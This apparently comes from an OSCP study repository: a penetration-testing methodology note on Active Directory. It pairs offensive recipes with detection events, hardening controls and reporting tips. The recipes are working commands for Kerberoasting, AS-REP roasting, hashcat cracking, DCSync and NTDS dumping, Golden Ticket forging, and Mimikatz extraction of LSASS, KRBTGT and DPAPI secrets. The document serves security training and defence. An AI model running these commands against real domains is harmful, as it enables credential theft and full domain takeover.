## 1. Overview

Active Directory (AD) is Microsoft's directory service for Windows domain
networks. It stores objects (users, computers, groups, GPOs, trusts) and
provides authentication (Kerberos, NTLM) and authorization (ACLs) for the
entire domain or forest.

**Core components:**

- **Domain** - administrative boundary sharing a single AD database (NTDS.dit)
  and a single DNS namespace (e.g. `corp.local`).
- **Forest** - collection of one or more domains sharing a common schema,
  configuration, and global catalog. The forest is the top security boundary.
- **Organizational Unit (OU)** - container for objects; the primary delegation
  unit for Group Policy and administrative rights.
- **Domain Controller (DC)** - server hosting the AD database, Kerberos KDC,
  and (usually) DNS for the domain.
- **Global Catalog (GC)** - partial replica of all objects in the forest,
  used for cross-domain lookups.
- **Trusts** - relationships between domains/forests that allow authentication
  across boundaries (parent-child, tree-root, external, forest, shortcut).

**Authentication protocols:**

- **Kerberos** - default in modern AD. Ticket-based: TGT (Ticket Granting
  Ticket) from the KDC, then TGS (Ticket Granting Service) per service.
- **NTLM** - legacy challenge-response. Still present for compatibility;
  a common target for relay and Pass-the-Hash.
- **LDAP** - directory query protocol; LDAPS for encrypted queries.
- **DNS** - critical for AD; SRV records locate DCs and services.

## 2. Reconnaissance / Enumeration

**Offensive - unauthenticated:**

    # DNS enumeration (SRV records reveal DCs and services)
    nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local

    # SMB / LDAP fingerprinting
    netexec smb 10.10.10.10
    netexec ldap 10.10.10.10

    # Anonymous LDAP bind (rarely allowed, but check)
    ldapsearch -x -H ldap://10.10.10.10 -b "dc=corp,dc=local"

    # SMB null session / guest enumeration
    smbclient -L //10.10.10.10 -N

**Offensive - authenticated:**

    # Domain users and groups
    netexec ldap 10.10.10.10 -u USER -p PASS --users
    netexec ldap 10.10.10.10 -u USER -p PASS --groups

    # SPN-holders (Kerberoastable targets)
    GetUserSPNs.py corp.local/USER:PASS -dc-ip 10.10.10.10

    # AS-REP roastable accounts (no pre-auth)
    GetNPUsers.py corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt

    # BloodHound collection
    bloodhound-python -u USER -p PASS -d corp.local -ns 10.10.10.10 -c all
    netexec ldap 10.10.10.10 -u USER -p PASS --bloodhound --collection All

**Defensive - what to monitor:**

- LDAP queries for `servicePrincipalName` (Kerberoasting recon).
- LDAP queries for `userAccountControl` with `DONT_REQ_PREAUTH` bit.
- BloodHound-like enumeration patterns (bulk LDAP reads in short time).
- SRV record lookups from non-DC hosts.

## 3. Common Attack Vectors

**Authentication attacks:**

- **Kerberoasting** - request TGS for a service account's SPN, crack offline.
  Works for any authenticated user; target is the service account's password.
- **AS-REP Roasting** - request AS-REP for accounts with pre-auth disabled;
  crack offline. No authentication required.
- **NTLM Relay** - relay NTLM authentication to another service (SMB, LDAP,
  HTTP, MSSQL). Requires unsigned/unprotected target.
- **Pass-the-Hash (PtH)** - use NTLM hash directly for authentication.
- **Pass-the-Ticket (PtT)** - use a stolen Kerberos ticket for authentication.

**Credential abuse:**

- **GPP cpassword** - Group Policy Preferences stored AES-encrypted passwords
  in SYSVOL with a publicly-known key.
- **LAPS** - Local Administrator Password Solution; readable by users with
  `ReadLAPSPassword` or `AllExtendedRights` on the computer object.
- **DCSync** - replicate domain credentials from a DC (requires Replicating
  Directory Changes + Replicating Directory Changes All).
- **ACL abuse** - modify ACLs to grant rights (GenericAll, WriteDacl,
  WriteOwner, ForceChangePassword, AddMember).

**Lateral movement:**

- WinRM (5985/5986), SMB (445), WMI (135 + dynamic), RDP (3389), PsExec.

**Privilege escalation:**

- **ADCS** - misconfigured certificate templates (ESC1-ESC8, ESC11-ESC13).
- **Delegation** - unconstrained, constrained, resource-based constrained.
- **Trusts** - SID history injection, trust key extraction.
- **AdminSDHolder** - persistence via SDProp.

**Persistence:**

- **Golden Ticket** - forge TGT with KRBTGT hash.
- **Silver Ticket** - forge TGS with service account hash.
- **DCShadow** - register a rogue DC and push changes via replication.
- **Skeleton Key** - patch LSASS on a DC to accept a master password.

## 4. Exploitation Recipes

**Kerberoasting (authenticated user):**

    # Request TGS for all SPN-holders
    GetUserSPNs.py corp.local/user:password -dc-ip 10.10.10.10 -request

    # Crack with hashcat (mode 13100 = Kerberos 5 TGS-REP etype 23)
    hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt

    # Expected output:
    # $krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*...
    # Status...........: Cracked
    # Recovered........: ServiceAccountPassword

**AS-REP Roasting (unauthenticated):**

    # Enumerate users without pre-auth, request AS-REP
    GetNPUsers.py corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat

    # Crack with hashcat (mode 18200 = Kerberos 5 AS-REP etype 23)
    hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

    # Expected output:
    # $krb5asrep$23$svc_backup@CORP.LOCAL:...
    # Status...........: Cracked

**DCSync (user with replication rights):**

    # Dump all domain hashes
    secretsdump.py corp.local/user:password@10.10.10.10

    # Expected output:
    # Administrator:500:<LM_HASH_EMPTY>:<LM_HASH>:::
    # krbtgt:502:<LM_HASH_EMPTY>:<NTLM_HASH>:::

**Golden Ticket (with KRBTGT hash):**

    # Forge a TGT for Administrator (requires KRBTGT NTLM hash + domain SID)
    ticketer.py -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-... -domain corp.local Administrator

    # Use the ticket
    export KRB5CCNAME=Administrator.ccache
    psexec.py -k -no-pass corp.local/Administrator@dc01.corp.local

## 5. Post-Exploitation

**On a domain-joined host:**

- Dump LSASS for cleartext passwords and hashes:
    `sekurlsa::logonpasswords` (Mimikatz) or `procdump` + `pypykatz`.
- Extract cached domain credentials (DCC2):
    `sekurlsa::dpapi` / `lsadump::cache`.
- Enumerate local admin rights across the domain:
    `netexec smb 10.10.10.0/24 -u USER -p PASS --local-auth`.

**On a DC (highest impact):**

- Dump NTDS.dit:
    `secretsdump.py -just-dc corp.local/admin:pass@dc01`.
- Extract KRBTGT hash (allows Golden Tickets):
    `lsadump::dcsync /user:krbtgt` (Mimikatz).
- Extract DPAPI backup key (allows decrypting any user's DPAPI blobs):
    `lsadump::backupkeys /system:dc01 /export`.

**Persistence:**

- Golden Ticket (KRBTGT hash).
- Silver Ticket (per-service account hash).
- DCShadow (rogue DC registration).
- AdminSDHolder ACL backdoor.
- SID History injection (requires forest trust or DA).

## 6. Risk Context

Active Directory is the authentication and authorization backbone of most
enterprises. A single domain compromise typically yields:

- Full access to all domain-joined systems (via Golden Ticket or DCSync).
- Access to all user data reachable through domain trusts.
- Ability to persist undetectably for years (KRBTGT rotation is rare).
- Pivot point into cloud identity (Entra Connect sync account, AD FS, etc.).

**Blast radius:** the forest is the top security boundary. Compromise of one
domain in a forest usually implies compromise of all domains that trust it
(parent-child trusts are transitive within a forest).

**Why attacks succeed:**

- Default AD configurations allow low-privileged users to enumerate most
  objects (Kerberoasting needs no special rights).
- Service accounts are often over-privileged and have weak passwords.
- Legacy protocols (NTLM, SMBv1, unsigned LDAP) remain enabled.
- ADCS templates are misconfigured by default in many environments.

## 7. Root Causes

- **Over-privileged service accounts.** SPN-holders frequently have local
  admin on multiple servers, or domain admin in extreme cases.
- **Weak service account passwords.** Service accounts often bypass password
  policy (legacy) and are set once, never rotated.
- **Excessive ACLs.** GenericAll, WriteDacl, WriteOwner granted to broad
  groups (Authenticated Users, Domain Users) during migrations or by mistake.
- **Unconstrained delegation.** Servers trusted for unconstrained delegation
  cache TGTs of any user who authenticates to them.
- **NTLM not disabled.** Legacy authentication enables relay and PtH.
- **KRBTGT never rotated.** A stolen KRBTGT hash is valid indefinitely.
- **ADCS default templates.** Many templates are enrollable by Domain Users
  and allow client authentication.

## 8. Preventive Controls

**Identity hygiene:**

- Tiered administration model (Tier 0 = DCs, Tier 1 = servers, Tier 2 = users).
- Dedicated privileged access workstations (PAWs) for Tier 0.
- No domain admin logons on member servers or workstations.
- Service accounts: gMSA (group Managed Service Accounts) where possible;
  long random passwords (25+ chars) with regular rotation otherwise.
- Protected Users group for all privileged accounts.
- Disable pre-auth only where strictly necessary (never for service accounts).

**Protocol hardening:**

- Disable NTLM where possible (`Network security: Restrict NTLM`).
- Enforce LDAP signing and channel binding.
- Enforce SMB signing on all hosts.
- Disable SMBv1.
- Disable unconstrained Kerberos delegation.

**ADCS hardening:**

- Remove `Enroll` and `AutoEnroll` from templates that allow client auth.
- Require manager approval or authorized signatures for sensitive templates.
- Disable `EDITF_ATTRIBUTESUBJECTALTNAME2` on CAs.
- Enable CA audit logging.

**Privilege hygiene:**

- Audit ACLs regularly (BloodHound Enterprise or equivalent).
- Remove `GenericAll`, `WriteDacl`, `WriteOwner` from non-admin principals.
- Rotate KRBTGT twice (minimum) after any suspected compromise.
- Enable LAPS for local admin passwords on all workstations and servers.

**Monitoring:**

- Enable advanced audit policies (logon events, Kerberos events, object
  access, DS changes).
- Forward DC event logs to a SIEM in near real time.

## 9. Detection Controls

**Kerberoasting:**

- Event 4769 (Kerberos service ticket request) with encryption type 0x17
  (RC4) - modern AD should use AES. Baseline and alert on RC4 spikes.
- Volume of 4769 events from a single user in a short window.

**AS-REP Roasting:**

- Event 4768 (TGT request) with `Pre-Authentication Type = 0` (no pre-auth).
- Alert on any account with pre-auth disabled requesting a TGT from an
  unusual source.

**DCSync:**

- Event 4662 (directory service access) with replication GUIDs:
  - `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (Replicating Directory Changes)
  - `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (Replicating Directory Changes All)
- Alert on any account other than the DC machine account performing these.

**Golden Ticket:**

- Event 4769 with a TGT lifetime or encryption anomaly.
- Event 4624 (logon) with a user that should not have a valid TGT.
- Event 4672 (special privileges assigned) for non-admin users.

**NTLM Relay / PtH:**

- Event 4624 (logon) with `Logon Type 3` (network) and NTLM.
- Event 4776 (NTLM credential validation) with unusual source.

**ADCS abuse:**

- Event 4886 (certificate services: certificate issued).
- Event 4887 (certificate services: certificate request approved).
- CA audit log on templates with unusual SANs.

**General:**

- Honeytokens: fake SPN accounts, fake admin accounts in BloodHound-visible
  positions. Any authentication to them is a high-confidence alert.

## 10. Verification

**Offensive - did the attack work?**

- Kerberoasting: TGS hash cracked offline; validate the cracked password
  with `netexec smb` or `nxc winrm`.
- AS-REP Roasting: AS-REP hash cracked; validate similarly.
- DCSync: hashes dumped; validate by PtH to a DC (`secretsdump` output,
  then `psexec.py -hashes`).
- Golden Ticket: forged ticket accepted by `klist` and by a real service.

**Defensive - are controls effective?**

- Test Kerberoasting from a normal user - should generate a 4769 event with
  RC4 that is alerted.
- Test AS-REP Roasting - any pre-auth disabled account should appear in an
  audit report (should be zero).
- Test DCSync with a non-DC account - should be blocked by replication ACLs.
- Test NTLM relay with Responder + ntlmrelayx against an unsigned target -
  should fail if signing is enforced.
- Test ADCS ESC1 - enrollment should fail if the template is hardened.

## 11. OSCP Notes

- OSCP labs use a small domain (1-2 DCs); focus on enumeration and Kerberos
  attacks. ADCS is out of scope for OSCP but common in OSCP-like labs.
- Essential tools: `impacket` suite (GetUserSPNs, GetNPUsers, secretsdump,
  psexec, wmiexec), `netexec`, `BloodHound`, `PowerView`, `Rubeus`.
- **Always capture screenshots** for:
  - The initial foothold (first credential obtained).
  - User flag.
  - Privilege escalation step (DCSync, Golden Ticket, etc.).
  - Root/Administrator flag.
- The `> [!IMPORTANT]` OSCP reporting note applies to foothold, lateral
  movement, and privilege escalation commands - see
  `methodology/OSCP-Reporting.md`.

## 12. Production Notes

- In production, AD attacks are noisy: 4769, 4768, 4662 events are logged
  by default on modern DCs (with advanced audit enabled).
- Kerberoasting in production is often a red herring: service accounts may
  have 25+ char passwords that cannot be cracked.
- AS-REP Roasting is rare in hardened environments (pre-auth is rarely
  disabled).
- DCSync requires specific rights; most real-world AD compromises use it
  only after escalation to Domain Admin or equivalent.
- ADCS is the highest-yield modern AD attack surface - prioritize ADCS
  enumeration over Kerberoasting in mature environments.
- Entra Connect (Azure AD Connect) is a common pivot from on-prem AD to
  cloud; the sync account often has DCSync rights.

## 13. References

**Microsoft documentation:**

- [Active Directory Domain Services overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview)
- [Kerberos authentication overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
- [Group Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)

**MITRE ATT&CK:**

- [Credential Access - OS Credential Dumping (T1003)](https://attack.mitre.org/techniques/T1003/)
- [Credential Access - Steal or Forge Kerberos Tickets (T1558)](https://attack.mitre.org/techniques/T1558/)
- [Lateral Movement - Remote Services (T1021)](https://attack.mitre.org/techniques/T1021/)

**Tools:**

- [Impacket](https://github.com/fortra/impacket) - GetUserSPNs, GetNPUsers, secretsdump, psexec, wmiexec, ticketer
- [netexec](https://github.com/Pennyw0rth/NetExec) - SMB/LDAP/WinRM enumeration
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) - AD attack path mapping
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) - PowerShell AD enumeration
- [Rubeus](https://github.com/GhostPack/Rubeus) - Kerberos attack toolkit

**Research:**

- [ADSecurity.org](https://adsecurity.org/) - Sean Metcalf's AD security research
- [The Hacker Recipes - Active Directory](https://www.thehacker.recipes/ad)
- [SpecterOps blog](https://posts.specterops.io/)
- [Certified Pre-Owned (ADCS research)](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)